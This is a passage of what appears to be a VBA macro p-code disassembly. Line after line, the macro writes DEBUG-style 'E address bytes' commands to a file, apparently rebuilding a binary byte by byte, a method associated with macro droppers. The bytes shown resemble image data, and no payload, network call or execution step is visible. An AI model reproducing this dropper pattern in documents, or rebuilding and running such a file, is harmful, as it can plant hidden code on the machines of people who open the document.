' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6B20 39 4F 6F 84 9A 84 99 AE 48 5D 72 4B 62 78 64 7A"
' 	PrintItemNL 
' Line #1909:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6B30 93 26 3C 55 32 4A 62 43 5B 73 45 5B 74 39 4D 66"
' 	PrintItemNL 
' Line #1910:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6B40 2E 43 59 2C 41 56 23 3C 4C 25 40 4E 2F 47 59 13"
' 	PrintItemNL 
' Line #1911:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6B50 29 3B 3D 4D 5E 51 5B 6C 7B 84 8E 9B A2 AB 9B A1"
' 	PrintItemNL 
' Line #1912:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6B60 AC 83 8C 9A 67 74 8A 63 72 8C 6C 7B 9B 71 80 A1"
' 	PrintItemNL 
' Line #1913:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6B70 7C 88 AA 8E 9A BE 9C A7 D3 90 9C CC 88 93 C5 86"
' 	PrintItemNL 
' Line #1914:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6B80 91 C5 88 91 CA 89 91 CC 8A 95 CF 8E 99 D2 91 9D"
' 	PrintItemNL 
' Line #1915:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6B90 D3 8C 9A CE 86 95 C6 7F 8E BF 77 86 B7 6F 7D B1"
' 	PrintItemNL 
' Line #1916:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6BA0 68 76 AA 63 71 A5 5A 69 9A 4E 5E 8D 46 54 84 48"
' 	PrintItemNL 
' Line #1917:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6BB0 58 86 4D 5E 89 4B 5E 84 43 56 7B 3C 50 73 2A 3F"
' 	PrintItemNL 
' Line #1918:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6BC0 5F 20 35 55 21 36 55 30 44 63 2A 3C 59 22 34 51"
' 	PrintItemNL 
' Line #1919:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6BD0 24 34 51 4B 5D 7A 40 55 70 36 4D 67 52 6A 82 43"
' 	PrintItemNL 
' Line #1920:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6BE0 5B 73 3A 52 6A 1C 34 4A 2B 44 58 5D 77 88 68 82"
' 	PrintItemNL 
' Line #1921:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6BF0 93 63 7D 8E 63 7D 8E 53 6D 7E 65 7F 90 7C 96 A7"
' 	PrintItemNL 
' Line #1922:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6C00 5E 78 89 42 5B 6F 13 2C 40 31 49 5F 45 5E 72 5B"
' 	PrintItemNL 
' Line #1923:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6C10 74 88 3F 57 6B 52 6A 7E 45 5D 71 38 52 63 5D 77"
' 	PrintItemNL 
' Line #1924:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6C20 88 51 6D 7E 52 6C 7C 6B 84 94 73 8A 9A A1 B5 C6"
' 	PrintItemNL 
' Line #1925:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6C30 7D 8F A0 5F 73 85 77 8F A3 75 8D A1 54 68 7A 7A"
' 	PrintItemNL 
' Line #1926:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6C40 8A 9B BA C7 D5 00 00 0A 00 00 F5 F6 FA EC ED F1"
' 	PrintItemNL 
' Line #1927:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6C50 DA DC DD CF D1 D2 BE C2 C3 B4 B9 BC 00 00 06 BA"
' 	PrintItemNL 
' Line #1928:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6C60 C4 CE D5 E2 F0 D0 E2 F3 AA BF D4 9E B5 CB A6 BE"
' 	PrintItemNL 
' Line #1929:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6C70 D4 A7 BF D5 A8 C0 D4 95 AD C3 5B 75 8D 31 4B 63"
' 	PrintItemNL 
' Line #1930:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6C80 41 59 71 2E 45 5B 70 85 9A 71 86 9B 46 5B 70 56"
' 	PrintItemNL 
' Line #1931:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6C90 6B 81 4E 64 7D 2B 40 5B 3A 51 6B 3C 53 6D 3F 53"
' 	PrintItemNL 
' Line #1932:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6CA0 6C 3B 50 66 35 45 5C 29 3D 4F 1C 33 42 18 32 40"
' 	PrintItemNL 
' Line #1933:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6CB0 25 3D 4F 11 26 3B 30 41 56 3D 49 5B 6A 72 7F 8F"
' 	PrintItemNL 
' Line #1934:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6CC0 95 A0 8B 93 A0 75 7F 90 64 74 8B 66 78 95 6D 7E"
' 	PrintItemNL 
' Line #1935:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6CD0 9F 72 80 A4 7E 87 AC 88 91 B7 8B 97 C1 86 93 BF"
' 	PrintItemNL 
' Line #1936:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6CE0 82 8E BE 7E 89 BD 7B 84 BD 7A 83 BC 79 82 BB 77"
' 	PrintItemNL 
' Line #1937:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6CF0 83 B9 7E 8B BF 84 92 C3 89 97 C7 86 96 C4 7C 8C"
' 	PrintItemNL 
' Line #1938:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6D00 BB 70 80 AF 67 76 A7 63 71 A5 5D 6B 9F 53 62 93"
' 	PrintItemNL 
' Line #1939:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6D10 49 59 88 46 56 84 47 5A 85 48 5C 85 44 5A 7E 3F"
' 	PrintItemNL 
' Line #1940:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6D20 55 78 32 49 69 1F 37 55 1E 33 52 31 47 63 2D 3F"
' 	PrintItemNL 
' Line #1941:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6D30 5C 1F 31 4E 1C 2C 49 41 53 70 49 5E 79 35 4C 66"
' 	PrintItemNL 
' Line #1942:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6D40 4E 66 7E 46 5E 76 43 5B 71 26 3F 53 28 41 55 56"
' 	PrintItemNL 
' Line #1943:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6D50 70 81 64 7E 8F 5F 79 8A 62 7C 8D 54 6E 7F 72 8B"
' 	PrintItemNL 
' Line #1944:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6D60 9F 7C 95 A9 50 69 7D 2B 44 58 1D 38 4D 34 4F 64"
' 	PrintItemNL 
' Line #1945:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6D70 51 6A 7E 5F 78 8C 42 5A 6E 5E 76 8A 4E 67 7B 38"
' 	PrintItemNL 
' Line #1946:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6D80 53 67 53 6F 80 59 77 88 57 74 83 65 7F 8F 6D 86"
' 	PrintItemNL 
' Line #1947:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6D90 96 97 AB BC 7A 8C 9D 6C 80 92 6C 84 9A 7A 92 A8"
' 	PrintItemNL 
' Line #1948:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6DA0 86 95 A8 A9 B6 C6 C2 CC DD 00 04 12 00 00 F5 F7"
' 	PrintItemNL 
' Line #1949:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6DB0 F8 EC EE EF DC DE DF D0 D2 D3 C1 C3 C4 B5 B8 BC"
' 	PrintItemNL 
' Line #1950:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6DC0 00 00 04 BE C9 D1 D1 DE EC D2 E4 F5 B5 CA DF 9E"
' 	PrintItemNL 
' Line #1951:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6DD0 B5 CB A2 B9 CF 9E B5 CB 96 AE C2 9E B6 CC 5D 77"
' 	PrintItemNL 
' Line #1952:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6DE0 8F 35 4F 67 3C 54 6C 3B 52 68 75 8A 9F 63 78 8D"
' 	PrintItemNL 
' Line #1953:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6DF0 47 5C 71 57 6C 82 38 4E 67 30 45 60 3E 55 6F 31"
' 	PrintItemNL 
' Line #1954:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6E00 48 62 3B 4F 68 41 56 6C 35 45 5C 20 31 44 19 2D"
' 	PrintItemNL 
' Line #1955:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6E10 3E 10 27 37 22 37 4C 17 2A 3F 23 31 47 26 2F 43"
' 	PrintItemNL 
' Line #1956:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6E20 4F 56 65 79 7F 8C 74 7B 8A 63 6F 81 5B 6C 86 61"
' 	PrintItemNL 
' Line #1957:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6E30 75 94 6A 7D A0 79 89 AE 84 8F B5 7E 89 AF 75 82"
' 	PrintItemNL 
' Line #1958:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6E40 A8 6C 78 A0 5B 66 92 47 51 80 3A 43 75 3A 45 77"
' 	PrintItemNL 
' Line #1959:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6E50 46 51 83 51 5D 8D 51 5E 8C 5E 6E 98 72 83 AA 7C"
' 	PrintItemNL 
' Line #1960:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6E60 8E B3 7C 8D B4 77 88 AF 73 83 AD 72 82 AD 62 72"
' 	PrintItemNL 
' Line #1961:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6E70 A1 57 66 97 4A 5A 89 44 54 82 43 56 81 46 5A 83"
' 	PrintItemNL 
' Line #1962:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6E80 46 5B 81 46 5C 80 3D 53 76 23 3A 5A 1A 2F 4E 31"
' 	PrintItemNL 
' Line #1963:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6E90 47 63 31 43 60 1D 30 4B 13 24 3F 32 45 60 54 69"
' 	PrintItemNL 
' Line #1964:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6EA0 84 36 4D 67 4A 62 7A 4A 62 7A 4D 65 7B 34 4D 61"
' 	PrintItemNL 
' Line #1965:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6EB0 27 40 54 4E 68 79 61 7B 8C 5C 76 87 62 7C 8D 57"
' 	PrintItemNL 
' Line #1966:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6EC0 71 82 7D 96 AA 70 89 9D 3E 57 6B 1A 33 47 26 41"
' 	PrintItemNL 
' Line #1967:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6ED0 56 3D 58 6D 62 7B 8F 5D 76 8A 3D 55 69 63 7B 8F"
' 	PrintItemNL 
' Line #1968:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6EE0 55 6E 82 3F 5A 6E 4B 67 78 5B 79 8A 56 73 82 5F"
' 	PrintItemNL 
' Line #1969:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6EF0 79 89 6D 86 96 93 A7 B8 7F 91 A2 7D 91 A3 88 A0"
' 	PrintItemNL 
' Line #1970:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6F00 B6 93 AB C1 AF C0 D3 B7 C6 D6 C6 D3 E3 00 00 0B"
' 	PrintItemNL 
' Line #1971:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6F10 00 00 F5 F7 F8 EB ED EE DC DE DF CF D1 D2 C1 C3"
' 	PrintItemNL 
' Line #1972:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6F20 C4 B4 B7 BB 00 00 04 CA D3 DC C6 D3 E1 C7 D9 EA"
' 	PrintItemNL 
' Line #1973:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6F30 B9 CE E3 9B B2 C8 98 AF C5 9F B6 CC 94 AC C0 8E"
' 	PrintItemNL 
' Line #1974:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6F40 A6 BC 66 80 98 3F 59 71 38 50 68 3F 56 6C 79 8E"
' 	PrintItemNL 
' Line #1975:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6F50 A3 63 78 8D 50 65 7A 4B 60 76 32 48 61 34 49 64"
' 	PrintItemNL 
' Line #1976:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6F60 3B 52 6C 2C 43 5D 3F 53 6C 43 58 6E 30 40 57 16"
' 	PrintItemNL 
' Line #1977:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6F70 27 3C 1A 2B 3E 15 26 39 2B 3C 51 22 30 47 18 23"
' 	PrintItemNL 
' Line #1978:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6F80 39 12 1B 2F 35 3C 4D 59 60 71 5F 66 79 5D 68 7E"
' 	PrintItemNL 
' Line #1979:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6F90 59 69 86 5A 6E 91 69 7C A2 7C 8F B5 7D 8C B3 6C"
' 	PrintItemNL 
' Line #1980:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6FA0 78 A0 54 60 88 4E 5A 84 43 4E 7A 37 41 71 2B 34"
' 	PrintItemNL 
' Line #1981:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6FB0 66 27 30 62 31 3A 6C 3C 48 78 3B 48 74 44 53 7A"
' 	PrintItemNL 
' Line #1982:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6FC0 4F 5F 84 56 69 8C 5E 70 95 69 7B A0 76 88 AD 80"
' 	PrintItemNL 
' Line #1983:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6FD0 90 BA 68 78 A6 56 66 95 46 56 85 45 55 83 45 58"
' 	PrintItemNL 
' Line #1984:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6FE0 85 45 58 83 46 5A 83 4A 5F 85 44 5A 7E 29 3F 62"
' 	PrintItemNL 
' Line #1985:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6FF0 19 2E 4E 2E 43 62 32 44 61 20 33 4E 11 22 3C 22"
' 	PrintItemNL 
' Line #1986:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7000 36 4F 57 6C 87 3B 52 6C 4B 63 7B 4D 65 7D 4F 67"
' 	PrintItemNL 
' Line #1987:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7010 7D 40 59 6D 2A 43 57 49 63 74 61 7B 8C 59 73 84"
' 	PrintItemNL 
' Line #1988:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7020 63 7D 8E 5F 79 8A 7E 97 AB 5A 73 87 2F 48 5C 1F"
' 	PrintItemNL 
' Line #1989:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7030 38 4C 30 4B 60 47 62 77 65 7E 92 4C 65 79 37 4F"
' 	PrintItemNL 
' Line #1990:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7040 63 63 7B 8F 53 6C 80 43 5E 72 4C 68 79 4F 6D 7E"
' 	PrintItemNL 
' Line #1991:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7050 50 6D 7C 60 7A 8A 73 8C 9C 98 AC BD 8E A0 B1 88"
' 	PrintItemNL 
' Line #1992:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7060 9C AE 8B A3 B9 9A B2 C8 AF C0 D3 BB CA DA B6 C3"
' 	PrintItemNL 
' Line #1993:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7070 D1 00 00 0B 00 00 F5 F7 F8 EA EC ED DD DD DD CF"
' 	PrintItemNL 
' Line #1994:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7080 CF CF C0 C2 C3 B4 B7 BB 00 01 06 D9 E2 EB C3 D0"
' 	PrintItemNL 
' Line #1995:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7090 DE C7 D7 E8 D0 E4 F6 B2 C7 DC 95 AC C2 A5 BC D2"
' 	PrintItemNL 
' Line #1996:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 70A0 A5 BA CF 86 9D B3 63 7D 95 43 5D 75 37 4F 67 39"
' 	PrintItemNL 
' Line #1997:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 70B0 50 66 73 88 9D 65 7A 8F 5A 6F 84 3F 54 6A 34 4A"
' 	PrintItemNL 
' Line #1998:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 70C0 63 37 4C 67 39 50 6A 2E 45 5F 42 56 6F 3A 4F 65"
' 	PrintItemNL 
' Line #1999:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 70D0 25 35 4C 16 27 3C 17 25 3B 19 27 3D 30 3E 55 23"
' 	PrintItemNL 
' Line #2000:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 70E0 2F 47 0C 14 2B 07 0E 22 21 27 3A 3E 44 57 53 5C"
' 	PrintItemNL 
' Line #2001:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 70F0 70 5E 69 84 5C 6E 8D 5B 6E 93 65 79 A2 70 84 AD"
' 	PrintItemNL 
' Line #2002:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7100 6B 7B A5 5F 6C 98 6D 77 A7 5B 62 94 48 4E 83 3F"
' 	PrintItemNL 
' Line #2003:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7110 44 7B 3B 3F 79 38 3F 78 40 47 80 4B 52 89 52 5B"
' 	PrintItemNL 
' Line #2004:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7120 8D 52 5F 8D 52 5F 8B 4F 5D 87 4F 5E 85 59 68 8F"
' 	PrintItemNL 
' Line #2005:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7130 6D 7C A3 7A 8A B4 69 7A A5 52 62 90 44 54 82 4A"
' 	PrintItemNL 
' Line #2006:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7140 5A 88 4D 60 8D 48 5B 88 45 58 85 4A 5D 88 44 58"
' 	PrintItemNL 
' Line #2007:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7150 81 31 46 6C 1C 30 53 29 3E 5E 30 42 5F 27 3B 54"
' 	PrintItemNL 
' Line #2008:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7160 15 27 3E 16 2B 41 4E 64 7D 40 57 71 4D 65 7D 4E"
' 	PrintItemNL 
' Line #2009:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7170 66 7E 4B 63 79 46 5F 73 31 4A 5E 4A 64 75 61 7B"
' 	PrintItemNL 
' Line #2010:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7180 8C 53 6D 7E 61 7B 8C 70 8A 9B 7C 95 A9 4A 63 77"
' 	PrintItemNL 
' Line #2011:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7190 28 41 55 2B 44 58 3F 5A 6F 57 72 87 60 79 8D 3A"
' 	PrintItemNL 
' Line #2012:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 71A0 53 67 3B 53 67 62 7A 8E 50 69 7D 4A 65 79 53 6F"
' 	PrintItemNL 
' Line #2013:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 71B0 80 42 60 71 53 70 7F 69 83 93 77 90 A0 9A AE BF"
' 	PrintItemNL 
' Line #2014:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 71C0 9A AC BD 8B 9F B1 94 AC C2 9F B6 CC 9E B0 C1 A7"
' 	PrintItemNL 
' Line #2015:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 71D0 B6 C6 70 7D 8B 00 00 0B 00 00 F6 F8 F9 E9 EB EC"
' 	PrintItemNL 
' Line #2016:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 71E0 DD DD DD CD CD CD BF C1 C2 B3 B7 B8 00 02 07 E4"
' 	PrintItemNL 
' Line #2017:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 71F0 ED F6 C4 D1 DF C4 D4 E5 DA EE FF CC E1 F6 9A B1"
' 	PrintItemNL 
' Line #2018:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7200 C7 9D B5 C9 AF C4 D9 8D A4 BA 5A 74 8C 42 5C 74"
' 	PrintItemNL 
' Line #2019:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7210 39 51 69 34 4B 61 66 7B 90 61 76 8B 5D 72 87 3B"
' 	PrintItemNL 
' Line #2020:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7220 50 66 37 4D 66 3A 4F 6A 3A 51 6B 31 48 62 3E 52"
' 	PrintItemNL 
' Line #2021:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7230 6B 2C 41 57 1D 2D 44 19 2A 3F 11 1E 34 19 26 3C"
' 	PrintItemNL 
' Line #2022:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7240 2B 38 4E 1C 27 3D 00 06 1D 00 05 19 12 17 2C 2A"
' 	PrintItemNL 
' Line #2023:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7250 31 45 52 59 72 5E 6A 86 5C 6D 8E 55 68 8E 5A 6E"
' 	PrintItemNL 
' Line #2024:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7260 97 62 75 A0 64 76 9F 68 75 A3 53 5A 91 41 44 81"
' 	PrintItemNL 
' Line #2025:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7270 2D 2F 6F 27 29 69 27 29 6A 26 28 68 24 26 66 22"
' 	PrintItemNL 
' Line #2026:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7280 27 64 3E 45 7E 49 51 86 56 5F 91 5A 67 95 59 66"
' 	PrintItemNL 
' Line #2027:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7290 94 57 64 90 58 65 91 5B 68 94 62 72 9D 52 63 8E"
' 	PrintItemNL 
' Line #2028:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 72A0 4D 5D 8B 55 65 93 55 67 96 4C 5E 8D 47 58 89 4B"
' 	PrintItemNL 
' Line #2029:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 72B0 5D 8C 44 57 84 39 4D 76 20 33 58 25 3A 5A 2D 3F"
' 	PrintItemNL 
' Line #2030:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 72C0 5C 2C 40 59 1C 2F 44 10 25 3A 41 57 70 40 57 71"
' 	PrintItemNL 
' Line #2031:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 72D0 4A 62 7A 50 68 80 49 61 77 48 61 75 37 50 64 4D"
' 	PrintItemNL 
' Line #2032:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 72E0 67 78 5D 77 88 4D 67 78 61 7B 8C 85 9F B0 74 8D"
' 	PrintItemNL 
' Line #2033:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 72F0 A1 43 5C 70 27 40 54 34 4D 61 49 64 79 6A 85 9A"
' 	PrintItemNL 
' Line #2034:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7300 62 7B 8F 3A 53 67 4A 62 76 5D 75 89 50 69 7D 55"
' 	PrintItemNL 
' Line #2035:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7310 70 84 53 6F 80 3E 5C 6D 62 7F 8E 70 8A 9A 75 8E"
' 	PrintItemNL 
' Line #2036:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7320 9E 96 AA BB 9B AD BE 8D 9E B1 89 A0 B6 92 A7 BC"
' 	PrintItemNL 
' Line #2037:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7330 AB BB CC 89 96 A4 52 5D 6B 00 04 12 00 00 F8 F7"
' 	PrintItemNL 
' Line #2038:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7340 F9 EB EA EC DF DF DF CF CF CF C3 C3 C3 B5 B7 B8"
' 	PrintItemNL 
' Line #2039:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7350 00 00 05 E8 F2 F9 C6 D4 E0 B3 C3 D3 C0 D4 E6 D5"
' 	PrintItemNL 
' Line #2040:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7360 EA FF AA BF D4 94 A9 BE AE C3 D8 9D B5 C9 62 7C"
' 	PrintItemNL 
' Line #2041:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7370 94 43 5D 75 41 59 71 38 4F 65 62 77 8C 5C 71 86"
' 	PrintItemNL 
' Line #2042:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7380 59 6E 83 3D 52 68 39 4F 68 3C 51 6C 39 50 6A 2D"
' 	PrintItemNL 
' Line #2043:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7390 44 5E 37 4B 64 25 3A 50 1C 2C 43 18 29 3E 16 23"
' 	PrintItemNL 
' Line #2044:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
